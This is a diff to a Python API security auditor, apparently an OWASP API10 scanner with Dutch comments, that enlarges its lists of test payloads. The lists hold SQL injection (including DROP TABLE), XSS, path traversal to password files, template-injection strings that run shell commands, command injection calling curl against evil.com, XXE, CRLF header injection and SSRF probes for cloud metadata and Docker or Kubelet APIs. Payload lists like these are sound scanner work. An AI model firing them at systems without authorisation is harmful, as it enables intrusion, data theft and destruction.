@@ -44,18 +44,217 @@ Issue = Dict[str, Any]
 class SafeConsumptionAuditor:
     """Security auditor for OWASP API10 with comprehensive tests and INFO-logging"""
     INJECTION_PAYLOADS = {
-        'sql': ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT null,null--", "1; show tables--", "' AND SLEEP(5)--", "'||(SELECT version())||'"],
-        'xss': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '<body onload=alert(1)>'],
-        'path': ['../../../etc/passwd', '%2e%2e%2fetc%2fpasswd', '..%2f..%2f..%2fetc%2fpasswd'],
-        'nosql': ['{"$gt":""}', '{"$ne":null}', '{"$where":"sleep(5)"}'],
-        'ssti': ['{{7*7}}', '${{7*7}}', '<%= 7*7 %>'],
-        'ldap': ['*)(uid=*))(|(uid=*)', '*))%00'],
-        'xxe': ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
+    'sql': [
+        "' OR '1'='1",
+        "' OR 1=1--",
+        "'; DROP TABLE users--",
+        "' UNION SELECT null--",
+        "' AND SLEEP(5)--",
+        "'||(SELECT version())||'",
+        '" OR "" = ""',
+        "' OR 'a'='a"
+    ],   
+    'xss': [
+        '<script>alert(1)</script>',
+        '<img src=x onerror=alert(1)>',
+        '<svg/onload=alert(1)>',
+        '<body onload=alert(1)>',
+        '\"><script>alert(document.domain)</script>',
+        "'\"><iframe src=\"javascript:alert(1)\"></iframe>",
+        '<math><mi//xlink:href="javascript:alert(1)">'
+    ],
+    'path': [
+        # Klassiek
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\win.ini",
+        "/../../../../boot.ini",
+
+        # URL-encoded
+        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        "..%2f..%2f..%2fetc%2fshadow",
+        "/etc/passwd%00",
+
+        # Double URL-encoded
+        "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
+        "%252e%252e%252fetc%252fpasswd",  # = decode twice to ../etc/passwd
+
+        # UTF-8 en mixed encoding
+        "..%c0%af..%c0%afetc/passwd",       # Overlong UTF-8 slash
+        "..%e0%80%afetc/passwd",           # Overlong 3-byte encoding
+        "..%c1%9c..%c1%9cetc/passwd",      # Malformed UTF-8
+        "..%uff0e%uff0e%u2215etc%u2215passwd",  # Full-width + Unicode slash
+
+        # Backslashes & alternate separators
+        "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "..\\\\..\\\\etc\\\\passwd",
+        "..//..//..//etc//passwd",
+
+        # Null byte
+        "/etc/passwd%00.png",  # legacy PHP vuln vector
+
+        # Encoded slashes in mixed form
+        "..%2f..%2f%2e%2e%2fetc%2fpasswd",
+
+        # Bypassing file extension filters
+        "../../etc/passwd%00.jpg",
+        "../../etc/passwd..;/",
+    ],    
+    'nosql': [
+        '{"username": {"$ne": null}, "password": {"$ne": null}}', '{"$or": [{"admin": true}, {}]}',
+        '{"$where": "sleep(5000)"}', '{"username": {"$regex": ".*"}}', '{"$and": [{"a": {"$gt": ""}}, {"b": {"$lt": ""}}]}'
+    ],
+    'ssti': [
+        "{{7*7}}", "${{7*7}}", "<%= 7*7 %>", "{{config}}", "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+    ],
+    'ldap': [
+        "*)(&(userPassword=*))", "(&(objectClass=*)(uid=*))", "*)%00", "*)(cn=*))(|(cn=*", "*))(|"
+    ],
+    'xxe': [
+        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
+        "<!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hosts'>]><data>&file;</data>",
+        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % ext SYSTEM 'http://evil.com/ext.dtd'> %ext;]>"
+    ],
+    'cmdi': [
+        ";whoami", "|id", "&nslookup test", "`id`", "$(id)", "|| ping -c 1 evil.com", "&& curl http://evil.com"
+    ],
+    'jsonp': [
+        "callback=alert", "callback=console.log", "jsonp=alert", "cb=alert", "callbackName=alert"
+    ]
     }
-    CRLF_PAYLOADS = ['%0d%0aX-Evil: test', '\r\nSet-Cookie: evil=1']
-    HPP_PARAMS = ['id', 'q']
-    SSRF_PAYLOADS = ['http://169.254.169.254/latest/meta-data/', 'file:///etc/passwd', 'gopher://127.0.0.1:6379/_PING']
-    GRAPHQL_INTROSPECTION_QUERY = '{ __schema { types { name } } }'
+    CRLF_PAYLOADS = [
+    '%0d%0aX-Evil: injected',          # klassiek CRLF
+    '%0a%0dSet-Cookie: pwned=true',    # omgekeerde volgorde
+    '\r\nX-Injected-Header: crlf',     # directe CRLF
+    '\r\nSet-Cookie: session=abc123',  # cookie injectie
+    '%0d%0aLocation: https://evil.com',# redirect injectie
+    '%0d%0aContent-Length: 0',         # header truncatie
+    '%0d%0aContent-Type: text/html',   # content type override
+    '%0d%0aRefresh: 0; url=https://evil.com',  # redirect via refresh
+    '%0d%0aLink: </malicious>; rel=preload',   # preload link injectie
+    '%0d%0aX-Frame-Options: DENY',     # security header override
+    '%0d%0aX-XSS-Protection: 0',       # XSS bescherming uitschakelen
+    '%0d%0aAccess-Control-Allow-Origin: *',  # CORS bypass
+    '%0d%0aVary: Origin',              # cache & CORS manipulatie
+    '%0d%0aSet-Cookie: __Host-pwned=1; Path=/; Secure; HttpOnly',
+    '%0d%0aConnection: close',         # response manipulatie
+    ]
+    HPP_PARAMS = [
+    'id', 'q', 'search', 'filter', 'sort', 'order', 'page', 'offset', 'limit',
+    'username', 'user', 'email', 'token', 'session', 'auth', 'access', 'role',
+    'callback', 'lang', 'debug', 'redirect', 'ref', 'category', 'tag', 'type',
+    'status', 'id[]', 'name', 'fields', 'expand', 'include', 'exclude'
+    ]
+
+    SSRF_PAYLOADS = [
+    # Lokale metadata services (cloud)
+    "http://169.254.169.254/latest/meta-data/",         # AWS EC2
+    "http://169.254.169.254/metadata/instance",         # Azure
+    "http://169.254.169.254/computeMetadata/v1/",       # GCP
+    "http://100.100.100.200/latest/meta-data/",         # Alibaba Cloud
+    "http://metadata.google.internal/computeMetadata/",
+
+    # Lokale bestanden en protocollen
+    "file:///etc/passwd", "file:///c:/windows/win.ini",
+    "file:///proc/self/environ", "file:///sys/class/net/eth0/address",
+
+    # Gopher en Redis
+    "gopher://127.0.0.1:6379/_PING", "gopher://127.0.0.1:11211/",
+    "gopher://127.0.0.1:80/_GET / HTTP/1.0",             # HTTP tunnel
+
+    # DNS rebinding / SSRF exfil via callback
+    "http://localhost", "http://127.0.0.1", "http://[::1]",
+    "http://0.0.0.0", "http://2130706433",               # 127.0.0.1 in int
+    "http://example.com@127.0.0.1",                      # Username trick
+    "http://127.0.0.1.nip.io",                           # Wildcard DNS
+    "http://127.0.0.1.xip.io",
+
+    # Headers for SSRF probes (optional)
+    "http://attacker.com/ssrf/test",                    # Outbound test
+    "http://burpcollaborator.net",                      # Interact.sh / OAST
+    "http://requestbin.net/r/abc123",                   # Monitoring SSRF
+
+    # Custom ports and service abuse
+    "http://127.0.0.1:80", "http://localhost:8000",
+    "http://localhost:2375/version",                    # Docker API
+    "http://localhost:10250/pods",                      # Kubernetes Kubelet
+    "http://localhost:5984/_all_dbs",                   # CouchDB
+    ]
+
+    GRAPHQL_INTROSPECTION_QUERY = """
+    query IntrospectionQuery {
+    __schema {
+        queryType { name }
+        mutationType { name }
+        subscriptionType { name }
+        types {
+        ...FullType
+        }
+        directives {
+        name
+        description
+        locations
+        args {
+            ...InputValue
+        }
+        }
+    }
+    }
+
+    fragment FullType on __Type {
+    kind
+    name
+    description
+    fields(includeDeprecated: true) {
+        name
+        description
+        args {
+        ...InputValue
+        }
+        type {
+        ...TypeRef
+        }
+        isDeprecated
+        deprecationReason
+    }
+    inputFields {
+        ...InputValue
+    }
+    interfaces {
+        ...TypeRef
+    }
+    enumValues(includeDeprecated: true) {
+        name
+        description
+        isDeprecated
+        deprecationReason
+    }
+    possibleTypes {
+        ...TypeRef
+    }
+    }
+
+    fragment InputValue on __InputValue {
+    name
+    description
+    type { ...TypeRef }
+    defaultValue
+    }
+
+    fragment TypeRef on __Type {
+    kind
+    name
+    ofType {
+        kind
+        name
+        ofType {
+        kind
+        name
+        }
+    }
+    }
+"""
+
     
     def __init__(self, base_url: str, session: Optional[requests.Session] = None, timeout: int = 8):
         self.base_url = base_url.rstrip('/')
